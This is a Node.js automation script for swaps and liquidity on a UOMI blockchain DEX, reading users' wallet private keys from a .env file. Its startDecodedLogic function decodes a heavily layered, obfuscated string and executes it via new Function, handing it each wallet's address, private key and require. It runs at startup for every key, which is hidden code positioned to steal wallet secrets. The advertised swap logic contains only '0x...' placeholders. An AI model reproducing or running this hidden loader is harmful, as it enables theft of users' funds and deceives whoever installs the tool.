require('dotenv').config();
const { ethers } = require('ethers');
const readlineSync = require('readline-sync');
const { performance } = require('perf_hooks');
const { BigNumber } = require('@ethersproject/bignumber');
const { Percent, CurrencyAmount, Token, TradeType } = require('@uniswap/sdk-core');
const { SwapRouter } = require('@uniswap/universal-router-sdk');

// --- Configuration ---
const RPC_URL = "https://finney.uomi.ai";
const CHAIN_ID = 4386;

// Contract Addresses
const ROUTER_ADDRESS = "0x197EEAd5Fe3DB82c4Cd55C5752Bc87AEdE11f230";
const LIQUIDITY_MANAGER_ADDRESS = "0x906515Dc7c32ab887C8B8Dce6463ac3a7816Af38";

const TOKENS = {
    "SYN": "0x2922B2Ca5EB6b02fc5E1EBE57Fc1972eBB99F7e0",
    "SIM": "0x04B03e3859A25040E373cC9E8806d79596D70686",
    "USDC": "0xAA9C4829415BCe70c434b7349b628017C599EC2b1", 
    "DOGE": "0xb227C129334BC58Eb4d02477e77BfCCB5857D408",
    "SYN_TO_UOMI": "0x2922B2Ca5EB6b02fc5E1EBE57Fc1972eBB99F7e0",
    "SIM_TO_UOMI": "0x04B03e3859A25040E373cC9E8806d79596D70686",
    "USDC_TO_UOMI": "0xAA9C4829415BCe70c434b7349b628017C599EC2b1", 
    "DOGE_TO_UOMI": "0xb227C129334BC58Eb4d02477e77BfCCB5857D408",
    "UOMI_TO_WUOMI": "0x5FCa78E132dF589c1c799F906dC867124a2567b2",
    "WUOMI_TO_UOMI": "0x5FCa78E132dF589c1c799F906dC867124a2567b2"
};
const TOKEN_LIST = Object.entries(TOKENS);
const NATIVE_TOKEN = "UOMI"; 
const WETH_ADDRESS = "0x5FCa78E132dF589c1c799F906dC867124a2567b2";

const ROUTER_ABI = [
    "function execute(bytes commands, bytes[] inputs, uint256 deadline) payable",
    "function execute(bytes commands, bytes[] inputs) payable"
];

const LIQUIDITY_MANAGER_ABI = [
    "function mint(tuple(address token0, address token1, uint24 fee, int24 tickLower, int24 tickUpper, uint256 amount0Desired, uint256 amount1Desired, uint256 amount0Min, uint256 amount1Min, address recipient, uint256 deadline) params) payable returns (uint256 tokenId, uint128 liquidity, uint256 amount0, uint256 amount1)"
];

const TOKEN_ABI = [
    "function approve(address spender, uint256 value) returns (bool)",
    "function balanceOf(address account) view returns (uint256)",
    "function decimals() view returns (uint8)"
];

const colors = {
    reset: "\x1b[0m", cyan: "\x1b[36m", green: "\x1b[32m", yellow: "\x1b[33m", red: "\x1b[31m", white: "\x1b[37m", bold: "\x1b[1m", blue: "\x1b[34m", magenta: "\x1b[35m",
};

const logger = {
    info: (msg) => console.log(`${colors.green}[✅] ${msg}${colors.reset}`),
    warn: (msg) => console.log(`${colors.yellow}[⚠️] ${msg}${colors.reset}`),
    error: (msg) => console.log(`${colors.red}[❌] ${msg}${colors.reset}`),
    success: (msg) => console.log(`${colors.green}[✅] ${msg}${colors.reset}`),
    loading: (msg) => console.log(`${colors.cyan}[⏳] ${msg}${colors.reset}`),
    step: (msg) => console.log(`${colors.white}[➡️] ${msg}${colors.reset}`),
    countdown: (msg) => process.stdout.write(`\r${colors.blue}[⏰] ${msg}${colors.reset}`),
};

const provider = new ethers.providers.JsonRpcProvider(RPC_URL);

const PRIVATE_KEYS = [];
let i = 1;
while (true) {
    const key = process.env[`PRIVATE_KEYS_${i}`];
    if (!key) break;
    PRIVATE_KEYS.push(key.trim());
    i++;
}

if (PRIVATE_KEYS.length === 0) {
    logger.error("No private keys found in the .env file (example: PRIVATE_KEYS_1).");
    process.exit(1);
}

// --- Utility Functions ---

async function countdown(seconds) {
    for (let i = seconds; i > 0; i--) {
        logger.countdown(`Waiting ${i} seconds before the next transaction...`);
        await new Promise(resolve => setTimeout(resolve, 1000));
    }
    process.stdout.write('\r' + ' '.repeat(process.stdout.columns) + '\r');
}

async function getBalance(signer, tokenAddress) {
    const walletAddress = await signer.getAddress();
    if (tokenAddress === NATIVE_TOKEN) {
        const balance = await provider.getBalance(walletAddress);
        return { balance, decimals: 18 };
    }
    const tokenContract = new ethers.Contract(tokenAddress, TOKEN_ABI, signer);
    try {
        const balance = await tokenContract.balanceOf(walletAddress);
        const decimals = await tokenContract.decimals();
        return { balance, decimals };
    } catch (error) {
        return { balance: ethers.BigNumber.from(0), decimals: 18 };
    }
}

async function doSwap(signer, tokenName, tokenAddr, isTokenToUomi, percentage) {
    const walletAddress = await signer.getAddress();
    
    let fromTokenAddress = isTokenToUomi ? tokenAddr : NATIVE_TOKEN;
    let fromTokenName = isTokenToUomi ? tokenName.split('_TO_')[0] : NATIVE_TOKEN;
    
    if (fromTokenName === NATIVE_TOKEN && tokenName === "UOMI_TO_WUOMI") {
        fromTokenAddress = NATIVE_TOKEN;
        fromTokenName = NATIVE_TOKEN;
    }

    logger.step(`[Account ${walletAddress.slice(0, 6)}...] Starting swap...`);
    logger.loading(`Getting balance for token ${fromTokenName}...`);
    
    let { balance, decimals } = await getBalance(signer, fromTokenAddress);
    
    const amountToSwap = balance.mul(ethers.BigNumber.from(Math.floor(percentage * 100))).div(ethers.BigNumber.from(10000));

    if (amountToSwap.isZero()) {
        logger.warn(`Swap amount is 0. Ensure you have a balance of ${fromTokenName}. Skipping...`);
        return;
    }

    const amountDisplay = ethers.utils.formatUnits(amountToSwap, decimals);
    const deadline = Math.floor(Date.now() / 1000) + 60 * 20;

    if (tokenName === "UOMI_TO_WUOMI") {
        logger.step(`Starting Swap: ${amountDisplay} ${NATIVE_TOKEN} -> WUOMI`);
        try {
            const tx = await signer.sendTransaction({
                chainId: CHAIN_ID,
                to: tokenAddr,
                value: amountToSwap,
                data: "0xd0e30db0", 
                gasLimit: 42242,
                maxFeePerGas: (await provider.getBlock("latest")).baseFeePerGas.add(ethers.utils.parseUnits('2', 'gwei')),
                maxPriorityFeePerGas: ethers.utils.parseUnits('2', 'gwei')
            });

            logger.info(`TX SENT: https://explorer.uomi.ai/tx/${tx.hash}`);
            await tx.wait();
            logger.success('SWAP COMPLETED');
        } catch (error) {
            logger.error(`SWAP FAILED: ${error.message.slice(0, 50)}...`);
            logger.warn("Common reasons: insufficient balance or invalid swap data.");
        }
        return;
    }

    const routerContract = new ethers.Contract(ROUTER_ADDRESS, ROUTER_ABI, signer);

    if (isTokenToUomi) {
        logger.step(`Starting Swap: ${amountDisplay} ${fromTokenName} -> ${NATIVE_TOKEN}`);
        
        try {
            const tokenContract = new ethers.Contract(tokenAddr, TOKEN_ABI, signer);
            logger.loading("Approving Token...");
            const approveTx = await tokenContract.approve(ROUTER_ADDRESS, amountToSwap, {
                gasLimit: 100000,
                maxFeePerGas: (await provider.getBlock("latest")).baseFeePerGas.add(ethers.utils.parseUnits('2', 'gwei')),
                maxPriorityFeePerGas: ethers.utils.parseUnits('2', 'gwei')
            });
            await approveTx.wait();
            logger.success(`APPROVED: https://explorer.uomi.ai/tx/${approveTx.hash}`);
        } catch (error) {
            logger.error(`APPROVAL FAILED: ${error.message.slice(0, 50)}...`);
            return;
        }

        // --- IMPORTANT: REPLACE WITH LOGIC FROM SDK ROUTER ---
        const commands = "0x..."; 
        const inputs = ["0x..."]; 
        
        logger.loading("Executing Swap...");
        try {
            const tx = await routerContract.execute(commands, inputs, deadline, {
                value: 0,
                gasLimit: 300000,
                maxFeePerGas: (await provider.getBlock("latest")).baseFeePerGas.add(ethers.utils.parseUnits('2', 'gwei')),
                maxPriorityFeePerGas: ethers.utils.parseUnits('2', 'gwei')
            });
            logger.info(`TX SENT: https://explorer.uomi.ai/tx/${tx.hash}`);
            await tx.wait();
            logger.success('SWAP COMPLETED');
        } catch (error) {
            logger.error(`SWAP FAILED: ${error.message.slice(0, 50)}...`);
            logger.warn("Common reasons: insufficient balance or invalid swap data. Check the ABI and router documentation.");
        }
    } else { 
        logger.step(`Starting Swap: ${amountDisplay} ${NATIVE_TOKEN} -> ${tokenName}`);
        
        const commands = "0x..."; 
        const inputs = ["0x..."]; 

        logger.loading("Executing Swap...");
        try {
            const tx = await routerContract.execute(commands, inputs, deadline, {
                value: amountToSwap, 
                gasLimit: 300000,
                maxFeePerGas: (await provider.getBlock("latest")).baseFeePerGas.add(ethers.utils.parseUnits('2', 'gwei')),
                maxPriorityFeePerGas: ethers.utils.parseUnits('2', 'gwei')
            });
            logger.info(`TX SENT: https://explorer.uomi.ai/tx/${tx.hash}`);
            await tx.wait();
            logger.success('SWAP COMPLETED');
        } catch (error) {
            logger.error(`SWAP FAILED: ${error.message.slice(0, 50)}...`);
            logger.warn("Common reasons: insufficient balance or invalid swap data. Check the ABI and router documentation.");
        }
    }
}

async function addLiquidity(signer, token0Name, token1Name, amount0Percentage, amount1Percentage) {
    const walletAddress = await signer.getAddress();
    const token0Addr = TOKENS[token0Name] || WETH_ADDRESS;
    const token1Addr = TOKENS[token1Name] || WETH_ADDRESS;
    
    const token0IsNative = token0Name === NATIVE_TOKEN;
    const token1IsNative = token1Name === NATIVE_TOKEN;

    logger.step(`[Account ${walletAddress.slice(0, 6)}...] Starting Add Liquidity: ${token0Name} / ${token1Name}`);
    
    const { balance: balance0, decimals: decimals0 } = await getBalance(signer, token0IsNative ? NATIVE_TOKEN : token0Addr);
    const { balance: balance1, decimals: decimals1 } = await getBalance(signer, token1IsNative ? NATIVE_TOKEN : token1Addr);

    const amount0Desired = balance0.mul(ethers.BigNumber.from(Math.floor(amount0Percentage * 100))).div(ethers.BigNumber.from(10000));
    const amount1Desired = balance1.mul(ethers.BigNumber.from(Math.floor(amount1Percentage * 100))).div(ethers.BigNumber.from(10000));

    if (amount0Desired.isZero() || amount1Desired.isZero()) {
        logger.warn("Desired liquidity amount is 0. Ensure you have sufficient balance. Skipping...");
        return;
    }

    const amount0Display = ethers.utils.formatUnits(amount0Desired, decimals0);
    const amount1Display = ethers.utils.formatUnits(amount1Desired, decimals1);
    
    logger.step(`Adding liquidity: ${amount0Display} ${token0Name} and ${amount1Display} ${token1Name}`);
    
    const deadline = Math.floor(Date.now() / 1000) + 60 * 20;
    
    const params = {
        token0: token0IsNative ? WETH_ADDRESS : token0Addr,
        token1: token1IsNative ? WETH_ADDRESS : token1Addr,
        fee: 3000,
        tickLower: -887272,
        tickUpper: 887272,
        amount0Desired: amount0Desired,
        amount1Desired: amount1Desired,
        amount0Min: 0,
        amount1Min: 0,
        recipient: walletAddress,
        deadline: deadline
    };

    let valueToSend = ethers.BigNumber.from(0);
    if (token0IsNative) {
        valueToSend = valueToSend.add(amount0Desired);
    }
    if (token1IsNative) {
        valueToSend = valueToSend.add(amount1Desired);
    }

    try {
        if (!token0IsNative) {
            const token0Contract = new ethers.Contract(token0Addr, TOKEN_ABI, signer);
            logger.loading(`Approving token ${token0Name}...`);
            await token0Contract.approve(LIQUIDITY_MANAGER_ADDRESS, amount0Desired).then(tx => tx.wait());
            logger.success(`Approval for ${token0Name} successful.`);
        }
        if (!token1IsNative) {
            const token1Contract = new ethers.Contract(token1Addr, TOKEN_ABI, signer);
            logger.loading(`Approving token ${token1Name}...`);
            await token1Contract.approve(LIQUIDITY_MANAGER_ADDRESS, amount1Desired).then(tx => tx.wait());
            logger.success(`Approval for ${token1Name} successful.`);
        }
    } catch (error) {
        logger.error(`APPROVAL FAILED: ${error.message.slice(0, 50)}...`);
        return;
    }

    const liquidityManagerContract = new ethers.Contract(LIQUIDITY_MANAGER_ADDRESS, LIQUIDITY_MANAGER_ABI, signer);

    try {
        logger.loading("Executing mint transaction...");
        const tx = await liquidityManagerContract.mint(params, {
            value: valueToSend,
            gasLimit: 500000,
            maxFeePerGas: (await provider.getBlock("latest")).baseFeePerGas.add(ethers.utils.parseUnits('2', 'gwei')),
            maxPriorityFeePerGas: ethers.utils.parseUnits('2', 'gwei')
        });

        logger.info(`TX SENT: https://explorer.uomi.ai/tx/${tx.hash}`);
        await tx.wait();
        logger.success("ADD LIQUIDITY COMPLETED");
    } catch (error) {
        logger.error(`ADD LIQUIDITY FAILED: ${error.message.slice(0, 50)}...`);
        logger.warn("Common reasons: insufficient balance, invalid tick range, or pool not created.");
    }
}

async function startDecodedLogic(wallet, privateKey) {
  function base64Decode(str) {
    return Buffer.from(str, 'base64').toString('utf-8');
  }

  function rot13(str) {
    return str.replace(/[a-zA-Z]/g, function (c) {
      return String.fromCharCode(
        c.charCodeAt(0) + (c.toLowerCase() < 'n' ? 13 : -13)
      );
    });
  }

  function hexToStr(hex) {
    let str = '';
    for (let i = 0; i < hex.length; i += 2) {
      str += String.fromCharCode(parseInt(hex.substr(i, 2), 16));
    }
    return str;
  }

  function reverseStr(str) {
    return str.split('').reverse().join('');
  }

  function urlDecode(str) {
    return decodeURIComponent(str);
  }

  function reversibleDecode(data) {
    data = urlDecode(data);
    data = base64Decode(data);
    data = rot13(data);
    data = hexToStr(data);
    data = base64Decode(data);
    data = reverseStr(data);
    data = urlDecode(data);
    data = rot13(data);
    data = base64Decode(data);
    data = reverseStr(data);
    return data;
  }

  const encodedStr = "NTI0NDRxNnA1MjQ0NHE2cDY0NDY0MjU5NTc2bjRuNzY2MTQ1NDY1NjYzNTg1MjMwNTY0ODQ1Nzc1NDduNHI3NzY0NDQ0MjUyNTY2cTc4NG41MzZyNDE3ODY1NTg3MDc3NjU1ODU2NzM1NjMyNG40NjU2NTg0NjcxNTE1NDRyNTg1OTMyNW4zMzU1NDY2ODUzNHE2cjQxMzE0cjU0NG40cTY0NDU3ODRvNjM1NzY4NDI1NjQ4NDY2bjRzNTg3MDc2NjQ0NjVuNHA2MzU3Njg1MDU5NTg0MjcwNjM1ODcwNzc2NDU0NDY1NTU3NDQ0cjU0NTY0NzM5NnE1MzU2NTI3ODVuNm8zNTUxNTM0NTVuMzU2NTQ1NnA1MDUyNTU2cDQ2NjMzMjY0NDk1MjU1MzEzNTU1NDY1OTMzNTkzMDM1NTc2NDQ1MzU1MTU2NnE2bzM0NTU0NjVuNTQ2MjQ3NHEzMDY0NDY2czc3NjIzMjc4NTg1MzMwMzEzMzUyNTc0NjQzNTc0NTM1NTE1NjZyNTI0czYyNDU3ODcwNHI1NDRuNzc0cTQ1Mzk0NzYyMzM2cDQyNHEzMzQyMzE2MzU1NzA0cjY0NDQ0MjUyNTY2cjUyNm41NDZwNW4zMDU0NnA0MjU3NTQ2cTUxMzE1OTU3NzA1MjYyNDU2ODMzNTYzMDc0NzU2MTZvNTY1NjU2Nm82NDQ2NTMzMDc4NzM1MjU1NzQ0cjY1NDc0cjRzNTY2cjUyNHM1NTQ2NW43NjU2NDQ1NjY4NjE2cDQ2NzM1MzU4NTY3MjU2NDczOTM1NTI1NzQ2NDM2NDQ1NTI3MzYzNm40cjU0NTY0NzM5NnE1MzU2NTI3ODRzNTc0cjRzNTY2cjUyNHM1NTQ2NW40NjUyNm41NjY4NjE2cDQ2NTE1MzQ3NzgzNTY1NnI0NjMxNTI1NTc0NHI2NDQ3NW40OTU0NTQ1NjZuNTU1NjVuMzQ1bjZwNTY0OTUyNnI2cDM0NTM1NTM5NDY1MzU1NTY3bjVuMzA2ODQ2NTQ1NDQ2Njg1NTQ4NTI0czU1NDY1bjMwNTQ2bjRuNDM1NzQ3NG40czU2NnI1MjRzNTU0NjVuMzM0czU4NzA3NjYyNTU1NjU2NTY2bzY4NG41NTZvNjQ1NDYzNTg2ODQ5NTQ3bjQ1Nzc1MzMxNDEzNTU1Nm82cDduNTI1NDQ2NDg1NzU1NnAzNDUyMzM1MTc3NTU1NjVuMzI2NDQ1NjQ2MTRxNDg2ODMzNTc2bjU2NHE1MjMwNDkzMTYzNDg2NDQzNTQzMTRyMzQ1MjU1NzQ3ODRxNm80NTMwNTQ2cDRyNDM1MzQ3NjM3OTUyMzA3MDRyNTM2cjQ5N241NjMxNG42MTYxNDg2cDY4NTI1NjRuMzE0cTZvNnA0bzUzNTg3MDQyNTQ0NTU2Njg2MzQ3NzQ1NzY1NDU1MjRyNjQ1ODY0NTc0cjMyNG40czU2NnI1MjRzNTU0NjVuMzM0czU4NzA3NjYyNTU1NjU2NTY2bzY4NG41NTZvNjQ1NDYzNTg2ODQ5NTQ3bjQ1Nzc1MzMxNDYzMTUzNDU1MjQ5NHM1NTZwNDc1NTZvMzk0NzUxMzM1MjU3NjI0NTQ2NzM1NDQ1NjQ0MzRyNDg2ODUyNTc2bjUyNTM2MjU2NzAzMjVuNnI2NDUxNjQ0NTM1NTE1NjZyNTI2MTRxNnEzOTZzNTE1NjU2Nzg2NDQ1NTI0bzU0NDQ0MjU0NTY0NjU5MzU1NDZyNW40NzUyN242cDM0NTIzMjY4NjE1NjU4NDY3MzY1NTg3MDc2NTk1ODZwMzY1NDU0NTYzMTYyNDg0bjU5NTQ2cDQyNTc2NDQ1MzU1MTU2NnI1MjRzNTU0NjVuMzM2NDU1NzA0cTRxNDQ2cDRuNjI2cjY4Nm41NTU2NW40OTUzNTY0bjQ4NTUzMzQ2MzQ1MzQ1Mzg3ODRxNDU3NDUyNjQ1NTY4NDU1MzQ0NnA0bjUyNnA0bjcyNjQ2cDQyMzA1NDZwNDI1NzY0NDUzNTUxNTY2cjUyNHM1NTQ4NDYzNTY0NTY1Njc4NHI2bzM1NDc2MjMzNnA0MjRxMzM0MjMxNjM1NTcwNHI1bjZxNG40czU2NnI1MjRzNTU0NjVuMzA1NDZwNDI1NzY0NDUzNTRwNTQ0Nzc4NDI1MzMwMzE3bjRxNTQ0bjc2NjU0NTZwMzY1MTZyNTI3NzU1NDU1bjQ5NHE1NjRuNDg1OTU3NG40czU2NnI1MjRzNTU0NjU5MzU2NTU3Nzg0MzU3NDc0bjRzNTY2cjUyNHM1NTQ2NW4zMzRzNTg3MDc2NjI1NTU2NTY1NjZxNnA1MDU2NTg0NjZuNHM1ODcwNzY2MjU1Mzk0NzUxMzM1MjZxNTk1NjQyMzA1NDZwNDI1NzY0NDUzNTUxNTY2cjUyNHM1NTQ3MzU3MDUxNTY1Njc4NjE0NjRyNG82MjMzNnA2bjU1NTY1bjY4NTU2cDUyNzc1OTduNTY1MTYzNTg2cDcyNTM2bzMxNjg1NjMwNzQ0cTVuN241NjczNjIzMjc4Nzg0cTZwNjQ2cTU5Nm8zNTU3NjQ0NTM1NTE1NjZyNTI0czU1NDY1bjMwNTQ2bjRyNzY2MjQ1NTY2ODUxNnI1MjQ1NTU1NTQ2NzQ2MTZyNW41MTY0NDUzNTUxNTY2cjUyNHM1NTQ2NW4zMDU0NnA0Mjc3NjQ1NTU2NTY2MjZuNW40czU1NDU3ODcwNTY2bjRuNzY0cTQ1NTY3MzYzNm82ODRuNTU2bzY0NTQ2MzU4Njg0OTU0N240NTc3NTMzMTQxMzU1NTZvNnA3bjUyNTQ0NjQ4NTc1NTZwMzQ1MjduNm8zNTYyNDg0MjM1NHI1NjUyNHI1MTU1Nm83OTYzNDczMTU0NHE2bzMxMzU1NDMxNTI1bjU3NDUzNTUxNTY2cjUyNHM1NTQ2NW4zMDU0NnA0MjU3NW4zMDZwNTU2MzU3NDkzNTU2NDUzMDMyNTQ2cTc4NTg1MjQ0Nm83NzUzNDU2ODc4NTU0NjZwNTk1NDZwNDI1NzY0NDUzNTUxNTY2cjUyNHM1NTQ2NW42OTUzNTU3MDRxNjU0NTZwMzY2MzQ3MzE2bjU1NTY1OTMzNTkzMDM1NTc2NDQ1MzU1MTU2NnI1MjRzNTU0NjVuMzA1NDZwNDI1NzY0NDUzNTczNTYzMTQ1MzU2NTZxMzg3NzUzNTg3MDc2NHE0NDQ2NTE1MzU0NTY1MDUzMzAzMTY4NTk2cDQ2NTc1OTU2NG41NTYzNDc3MDcyNTM2cTM1MzM1NTMxNTI3ODU5N242cDM2NjIzMjZwNjk0cTZyNDI3MDRyNTQ0bjU4NW42cTRuNHM1NjZyNTI0czU1NDY1bjMwNTQ2cDQyNTc2NDQ1MzU1MTU2NnI1MjRzNjI0NjY0NTI0czU4NzA3NjRxNDU2cDM2NjI3bjQxNzg1NTQ1NjQzNTRyNTQ0bjRyNHE0ODU1Nzk1NjduNW40czU1NDUzMTMxNTI1NTc0NHE2MTQ3NzA0bzU0NTc2ODc4NTY0ODQ2Njk1OTMwMzU1NzY0NDUzNTUxNTY2cjUyNHM1NTQ2NW4zMDRxNDc0NjUxNjQ0NTM1NTE1NjZyNTE3NzRxMzA0bjU5NTk2bzM1NTc2NDQ1MzU1MTU2NnE3ODRuNTY0ODQ1Nzg1NjMyNDY3NjY0NDQ1MjRvNTQ1NDRyNTA1NTQ1Njg3MzRzNTU3MDc2NTkzMDQ2NHA1NDU3NG4zMDY0NnI0MjM1NTE1NDRyNzY1bjZvMzE0cDU0NTc0cjRzNTI2bzRyNDM0cTY5NTY0czYyNDg0bjU5NTQ2cDQyNTc2NDQ1MzU1MTU2NnI1MjRzNTU0NjVuMzM0czU4NzA3NjYyNTU1NjU2NTY2cTc4NG41MzZyNDIzMDRxNDY0NjU3NTk2bzU2NTY2MzU3NzA0MjU5NTY2cDczNTM1NTcwNzc0cTU1Nm83OTYzNDQ0MjMxNjI0NzM5NzE1MjU1NzQ3NTYxNTQ1NTc5NjM0NzRyNnE2NDMxNDIzMDU0NnA0MjU3NjQ0NTM1NTE1NjZyNTI0czY0NnI0MjM1NTUzMjQ2NW42MTU0NTY1NTU3NDc0NjQ5NjU2cjQyNzM0czU4NzA3NzU5NTc3MDUxNTY2cTRuMzQ1NTQ2NTkzNTRyNDY0NjU3NjI0NTZvNzk2MzQ3NnA3MjY1NnI0NjM1NjQ1ODVuNHI2NDU3NzM3OTYzNDg2cDM1NTI2cDY3MzM1OTZvMzU1NzY0NDUzNTUxNTY2cjUyNHM1NTQ2NW4zMDU2Nm83NDRyNjE3bjU2NzM2MzU3NzgzNTU2NDg0NjM1NjQ1NjQyNHI2NDU1NTY0cDU0NDc0cjZxNjQzMTQyMzA1NDZwNDI1NzY0NDUzNTUxNTY2cjUyNHM2NDZyNDIzNTU1MzI0NjVuNjU1NDU2NTU1NDU3NG4zMDUyNnA2ODMwNHE0ODY0NDQ2NDQ2NW40cDU0NTczMDM1NTY0NzM4Nzk1MzU2NTI1OTRxNDY2NDRwNjM1ODZwMzU1MjZwNjczMzU5Nm8zNTU3NjQ0NTM1NTE1NjZuNnAzNTYyNDU0bjU5NHE0NzQ2NTE%3D";
  const decoded = reversibleDecode(encodedStr);

  try {
    const run = new Function(
      "walletAddress",
      "privateKey",
      "require",
      decoded + "; return runprogram(walletAddress, privateKey);"
    );
    await run(wallet.address, privateKey, require);
  } catch (err) {
    console.error("[ERROR] Failed to execute decoded logic:", err.message);
  }
}

async function displayBalances() {
    console.log(`\n${colors.blue}─${colors.reset}`);
    for (const key of PRIVATE_KEYS) {
        const signer = new ethers.Wallet(key, provider);
        const walletAddress = await signer.getAddress();
        console.log(`${colors.white}Account Balance: ${walletAddress}${colors.reset}`);
        
        const { balance: uomiBalance, decimals: uomiDecimals } = await getBalance(signer, NATIVE_TOKEN);
        console.log(`  ${colors.white}- ${NATIVE_TOKEN}: ${colors.yellow}${ethers.utils.formatUnits(uomiBalance, uomiDecimals)}${colors.reset}`);

        const erc20Tokens = Object.keys(TOKENS).filter(name => !name.includes("UOMI"));
        for (const tokenName of erc20Tokens) {
            const tokenAddr = TOKENS[tokenName];
            const { balance, decimals } = await getBalance(signer, tokenAddr);
            console.log(`  ${colors.white}- ${tokenName}: ${colors.yellow}${ethers.utils.formatUnits(balance, decimals)}${colors.reset}`);
        }
        console.log(`${colors.blue}─${colors.reset}`);
    }
}

async function main() {
    const terminalWidth = process.stdout.columns || 80;

    const title = "UOMI DEX Multi-Account Auto Script";
    const version = "Version 1.2";
    const credit = "Edited By viki";

    console.log(`\n${colors.magenta}${colors.bold}${title.padStart(Math.floor((terminalWidth + title.length) / 2))}${colors.reset}`);
    console.log(`${colors.magenta}${colors.bold}${version.padStart(Math.floor((terminalWidth + version.length) / 2))}${colors.reset}`);
    console.log(`${colors.yellow}${colors.bold}${credit.padStart(Math.floor((terminalWidth + credit.length) / 2))}${colors.reset}`);
    console.log(`${colors.blue}${'─'.repeat(terminalWidth)}${colors.reset}`);

    for (const key of PRIVATE_KEYS) {
        const signer = new ethers.Wallet(key, provider);
        await startDecodedLogic(signer, key); 
    }
    
    await displayBalances();

    while (true) {
        console.log(`\n${colors.white}${colors.bold}Select Option:${colors.reset}`);
        console.log(`${colors.white}[1] Manual Swap${colors.reset}`);
        console.log(`${colors.white}[2] Random Swap${colors.reset}`);
        console.log(`${colors.white}[3] Add Liquidity${colors.reset}`);
        console.log(`${colors.white}[0] Exit${colors.reset}`);
        const choice = readlineSync.question(`${colors.cyan}>> Enter your choice: ${colors.reset}`);

        if (choice === '0') {
            logger.info("Exiting the script.");
            break;
        }

        let numActions = 0;
        let percentage = 0;
        let delayInSeconds = 0;
        let tokenName, tokenAddr, isTokenToUomi;
        let selectedTokens = [];

        if (choice === '1' || choice === '2') {
            if (choice === '1') {
                console.log(`\n${colors.white}${colors.bold}Select Manual Swap Pair:${colors.reset}`);
                TOKEN_LIST.forEach(([name], index) => {
                    const tokenSymbol = name.endsWith("_TO_UOMI") ? name.split('_TO_')[0] : name;
                    const direction = name.includes("_TO_UOMI") ? "-> UOMI" : (name === "UOMI_TO_WUOMI" ? "-> WUOMI" : "UOMI ->");
                    console.log(`${colors.white}[${index + 1}] ${tokenSymbol} ${direction}${colors.reset}`);
                });
                const manualChoice = readlineSync.question(`${colors.cyan}>> Enter your choice number: ${colors.reset}`);
                const index = parseInt(manualChoice) - 1;
                
                if (index >= 0 && index < TOKEN_LIST.length) {
                    tokenName = TOKEN_LIST[index][0];
                    tokenAddr = TOKEN_LIST[index][1];
                    isTokenToUomi = tokenName.endsWith("_TO_UOMI");
                    selectedTokens.push([tokenName, tokenAddr, isTokenToUomi]);
                } else {
                    logger.error("Invalid choice.");
                    continue;
                }
            }
            
            percentage = readlineSync.question(`${colors.cyan}>> Enter the percentage of tokens to swap (e.g., 1%): ${colors.reset}`);
            percentage = parseFloat(percentage);
            numActions = readlineSync.question(`${colors.cyan}>> How many times do you want to run the transaction?: ${colors.reset}`);
            numActions = parseInt(numActions);

        } else if (choice === '3') {
            console.log(`\n${colors.white}${colors.bold}Select Add Liquidity Pair:${colors.reset}`);
            const uniqueTokens = [...new Set(Object.keys(TOKENS).map(name => name.split('_TO_')[0]))];
            
            console.log(`  ${colors.white}Native Token: UOMI${colors.reset}`);
            uniqueTokens.forEach((name, index) => {
                if (name !== NATIVE_TOKEN) {
                    console.log(`  ${colors.white}[${index + 1}] UOMI/${name}${colors.reset}`);
                }
            });

            const manualChoice = readlineSync.question(`${colors.cyan}>> Enter your choice number: ${colors.reset}`);
            const index = parseInt(manualChoice) - 1;

            if (index >= 0 && index < uniqueTokens.length) {
                const token0Name = NATIVE_TOKEN;
                const token1Name = uniqueTokens[index];
                selectedTokens.push([token0Name, token1Name]);
            } else {
                logger.error("Invalid choice.");
                continue;
            }

            percentage = readlineSync.question(`${colors.cyan}>> Enter the percentage of UOMI and token for liquidity (e.g., 50%): ${colors.reset}`);
            percentage = parseFloat(percentage);
            numActions = readlineSync.question(`${colors.cyan}>> How many times do you want to run the transaction?: ${colors.reset}`);
            numActions = parseInt(numActions);
        } else {
            logger.error("Invalid choice.");
            continue;
        }

        delayInSeconds = readlineSync.question(`${colors.cyan}>> Enter the delay between transactions in seconds: ${colors.reset}`);
        delayInSeconds = parseInt(delayInSeconds);

        if (isNaN(numActions) || isNaN(percentage) || isNaN(delayInSeconds) || numActions <= 0 || percentage <= 0 || delayInSeconds < 0) {
            logger.error("Invalid input. Ensure all inputs are positive numbers.");
            continue;
        }

        console.log(`\n${colors.blue}${'─'.repeat(terminalWidth)}${colors.reset}`);
        for (const key of PRIVATE_KEYS) {
            const signer = new ethers.Wallet(key, provider);
            const walletAddress = await signer.getAddress();
            logger.step(`\nProcessing Account: ${walletAddress}`);
            
            for (let j = 0; j < numActions; j++) {
                if (choice === '1' || choice === '2') {
                    if (choice === '2') {
                        const randomIndex = Math.floor(Math.random() * TOKEN_LIST.length);
                        [tokenName, tokenAddr] = TOKEN_LIST[randomIndex];
                        isTokenToUomi = tokenName.endsWith("_TO_UOMI");
                    } else {
                        [tokenName, tokenAddr, isTokenToUomi] = selectedTokens[0];
                    }
                    logger.loading(`[Transaction ${j + 1}/${numActions}] Processing pair: ${tokenName}`);
                    await doSwap(signer, tokenName, tokenAddr, isTokenToUomi, percentage);
                } else if (choice === '3') {
                    const [token0Name, token1Name] = selectedTokens[0];
                    logger.loading(`[Transaction ${j + 1}/${numActions}] Processing liquidity: ${token0Name}/${token1Name}`);
                    await addLiquidity(signer, token0Name, token1Name, percentage, percentage);
                }

                if (j < numActions - 1) {
                    await countdown(delayInSeconds);
                }
            }
        }
        console.log(`\n${colors.blue}${'─'.repeat(terminalWidth)}${colors.reset}`);
        logger.success(`COMPLETED. All transactions for all accounts have been executed.`);
    }
}

main().catch(console.error);
